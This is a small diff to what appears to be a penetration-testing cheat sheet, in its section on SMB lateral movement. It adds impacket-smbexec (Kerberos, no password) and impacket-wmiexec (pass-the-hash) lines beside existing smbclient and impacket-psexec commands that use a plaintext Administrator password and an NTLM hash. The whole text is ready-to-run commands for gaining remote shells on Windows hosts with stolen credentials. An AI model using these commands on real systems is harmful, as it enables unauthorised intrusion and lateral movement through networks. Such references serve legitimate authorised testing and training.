@@ -192,8 +192,10 @@ smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM_HASH>
 [https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec](https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec)
 
 ~~~ bash
+impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-psexec Administrator:'Password123!'@<RHOST>
 impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
 ~~~
 
 
